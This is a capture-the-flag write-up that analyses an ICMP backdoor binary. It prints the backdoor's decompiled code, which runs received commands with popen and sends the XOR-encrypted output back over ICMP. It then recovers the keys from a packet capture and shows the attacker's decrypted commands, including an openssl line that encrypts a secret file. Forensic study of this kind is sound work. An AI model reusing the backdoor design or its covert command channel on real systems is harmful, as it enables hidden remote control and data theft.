N0PStopia has been attacked by PwnTopia! They installed a stealthy binary on one of our servers, but we did not understand what it does! Can you help? We saw some weird ICMP traffic during the attack, you can find attached a capture file.


# Solve

First thing we are given is the ELF file called pwntopiashl lets open it in ghidra and see if we find anything

Within main we have

```
undefined8 main(void)

{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  icmp_packet_listener();
  return 0;
}
```

It seeds the random number generator with the current time, then calls upon icmp_packet_listener() then exits

```

void icmp_packet_listener(void)

{
  int iVar1;
  ssize_t sVar2;
  size_t sVar3;
  size_t sVar4;
  char *pcVar5;
  ulong uVar6;
  sockaddr local_c818;
  undefined1 local_c808 [2];
  undefined2 local_c806;
  char local_c800 [8];
  undefined1 auStack_c7f8 [24];
  byte local_c7e0 [2];
  undefined2 local_c7de;
  byte local_c7dc;
  byte local_c7db;
  byte local_c7da;
  byte local_c7d9;
  byte local_c7d8 [25536];
  char local_6418 [20];
  char local_6404;
  char local_6403;
  undefined2 local_6402;
  uint local_58;
  uint local_54;
  FILE *local_50;
  int local_48;
  uint local_44;
  char *local_40;
  char *local_38;
  int local_2c;
  uint local_28;
  uint local_24;
  int local_20;
  uint local_1c;
  
  local_2c = socket(2,3,1);
  if (local_2c < 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  do {
    do {
      do {
        do {
          memset(local_6418,0,0x63c0);
          sVar2 = recv(local_2c,local_6418,0x63bf,0);
        } while (sVar2 < 1);
        local_38 = local_6418;
        local_40 = &local_6404;
        local_44 = 0x1c;
        if ((local_6404 == '\f') && (local_6403 == '#')) {
          local_c7e0[0] = (byte)local_6402;
          local_c7e0[1] = (byte)((ushort)local_6402 >> 8);
          iVar1 = rand();
          local_c7de = CONCAT11(local_c7de._1_1_,(char)iVar1);
          iVar1 = rand();
          local_c7d9 = (byte)iVar1;
          local_c7de = CONCAT11(local_c7d9,(byte)local_c7de);
          local_c7dc = local_c7e0[1] ^ local_c7e0[0];
          local_c7db = local_c7d9 ^ (byte)local_c7de;
          local_c7da = (byte)local_c7de ^ local_c7e0[0];
          local_c7d9 = local_c7d9 ^ local_c7e0[1];
          memset(local_c808,0,0x20);
          local_c818.sa_family = 2;
          local_c818.sa_data._2_4_ = *(undefined4 *)(local_38 + 0xc);
          local_c808[0] = 0;
          local_c806 = local_c7de;
          sleep(1);
          sendto(local_2c,local_c808,(long)local_48 + 8,0,&local_c818,0x10);
        }
      } while ((*local_40 != '\x13') || (local_40[1] != '*'));
      local_c818.sa_family = 2;
      local_c818.sa_data._2_4_ = *(undefined4 *)(local_38 + 0xc);
      memset(local_c7d8,0,0x63c0);
      memcpy(local_c7d8,local_6418 + local_44,(ulong)(0x63bf - local_44));
      local_28 = 0x63c0;
      while ((uVar6 = (ulong)(int)local_28, sVar3 = strlen((char *)local_c7d8), sVar3 <= uVar6 &&
             (local_c7d8[(int)(local_28 - 1)] == 0))) {
        local_28 = local_28 - 1;
      }
      for (local_24 = 0; (int)local_24 < (int)local_28; local_24 = local_24 + 1) {
        local_c7d8[(int)local_24] = local_c7d8[(int)local_24] ^ local_c7e0[local_24 & 7];
      }
      puts((char *)local_c7d8);
      fflush(stdout);
      local_50 = popen((char *)local_c7d8,"r");
    } while (local_50 == (FILE *)0x0);
    memset(local_c7d8,0,0x63c0);
    memset(local_6418,0,0x63c0);
    while (pcVar5 = fgets(local_6418,0x63c0,local_50), pcVar5 != (char *)0x0) {
      sVar3 = strlen((char *)local_c7d8);
      sVar4 = strlen(local_6418);
      if (0x63be < sVar4 + sVar3) break;
      strcat((char *)local_c7d8,local_6418);
    }
    pclose(local_50);
    sVar3 = strlen((char *)local_c7d8);
    for (local_24 = 0; (int)local_24 < (int)sVar3; local_24 = local_24 + 1) {
      local_c7d8[(int)local_24] = local_c7d8[(int)local_24] ^ local_c7e0[local_24 & 7];
    }
    local_28 = 0x63c0;
    while ((uVar6 = (ulong)(int)local_28, sVar3 = strlen((char *)local_c7d8), sVar3 <= uVar6 &&
           (local_c7d8[(int)(local_28 - 1)] == 0))) {
      local_28 = local_28 - 1;
    }
    local_20 = 0;
    local_1c = local_28;
    local_54 = (int)((ulong)(long)(int)local_28 >> 4) + 1;
    for (local_24 = 0; (int)local_24 < (int)local_54; local_24 = local_24 + 1) {
      memset(local_c808,0,0x20);
      local_c808[0] = 8;
      local_58 = local_1c;
      if (0x10 < local_1c) {
        local_58 = 0x10;
      }
      sprintf(local_c800,"%04d%04d",(ulong)(local_24 + 1),(ulong)local_54);
      memcpy(auStack_c7f8,local_c7d8 + local_20,(long)(int)local_58);
      local_20 = local_20 + local_58;
      local_1c = local_1c - local_58;
      sleep(1);
      sendto(local_2c,local_c808,(long)(int)local_58 + 0x10,0,&local_c818,0x10);
    }
  } while( true );
}
```

The core functionality of this is to listen for ICMP packets.

This malware uses two different ICMP packets:

- **Initialization packets** (bytes `0x0c` and `0x23`):
    - Sets up encryption keys using random values
    - Responds with a beacon packet
- **Command packets** (bytes `0x13` and `0x2a`):
    - Receives encrypted commands
    - Executes them via `popen()`
    - Sends encrypted results back

## Encryption Scheme

Uses a simple XOR cipher with an 8-byte key derived from:

- 2 bytes from the incoming packet
- 2 random bytes generated locally
- 4 XOR-combined bytes from these values

## Data Exfiltration
### Key Derivation and Decryption Process

In this analysis, we observed that the encryption key used for decrypting the payload is constructed dynamically from packet data using a combination of fixed and derived values.

#### Step 1: Extract the First Four Bytes of the Key

The first four bytes of the key are directly taken from specific bytes in the packet payload. For example, given the first four bytes as:

`da 0a de e0`

These correspond to:

- Key[0] = 0xda
- Key[1] = 0x0a
- Key[2] = 0xde
- Key[3] = 0xe0

These bytes are directly grabbed from the captured packet.
#### Step 2: Compute the Last Four Bytes of the Key

The remaining four bytes of the key are computed by XOR operations on pairs of the initial four bytes, using the following mapping:

| Key Index | Computation                   | Result (for `da 0a de e0`) |
| --------- | ----------------------------- | -------------------------- |
| Key[4]    | Key[1] ^ Key[0] = 0x0a ^ 0xda | 0xd0                       |
| Key[5]    | Key[3] ^ Key[2] = 0xe0 ^ 0xde | 0x3e                       |
| Key[6]    | Key[2] ^ Key[0] = 0xde ^ 0xda | 0x04                       |
| Key[7]    | Key[3] ^ Key[1] = 0xe0 ^ 0x0a | 0xea                       |

Thus, the full 8-byte key becomes:

`da 0a de e0 d0 3e 04 ea`

Or in one continuous string without spaces:

`da0adee0d03e04ea`

In the following payloads we get the following
```
Packet 4 payload: 3030303130303033af63badde0167685b57ef7c0b75760d7
Packet 5 payload: 3030303230303033ea22ac8fbf4a2dcabd78b195a04d39da
Packet 6 payload: 3030303330303033f278b18fa4170e
```

With the leading values being the packet numbers which are generated from we can remove those
```
sprintf(sequence_header, "%04d%04d", current_packet, total_packets);
```

```
af63badde0167685b57ef7c0b75760d7
ea22ac8fbf4a2dcabd78b195a04d39da
f278b18fa4170e
```

If we take the values and combine them we get
```
af63badde0167685b57ef7c0b75760d7ea22ac8fbf4a2dcabd78b195a04d39daf278b18fa4170e
```

Decoding that gets us

![](Images/Pasted%20image%2020250531175857.png)


We can repeat this for all of our keys
`da0adee0d03e04ea`
`3cffb4e8c35c8817`
`ea0adc44e098364e`

After sifting through all of the decrypted outputs we find the following commands. 
`
```
total 44
drwxr-xr-x  2 root root  4096 Mar 10 17:18 .
drwxrwxrwt 29 root root 16384 Mar 10 17:50 ..
-rwxr-xr-x  1 root root 16880 Mar 10 17:49 pwntopiashl
-rw-r--r--  1 root root    31 Mar 10 17:18 .secret
```

```
cat .secret | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops
```

```
U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o
```

We can reverse the last string using the password provided.

![](Images/Pasted%20image%2020250531180053.png)

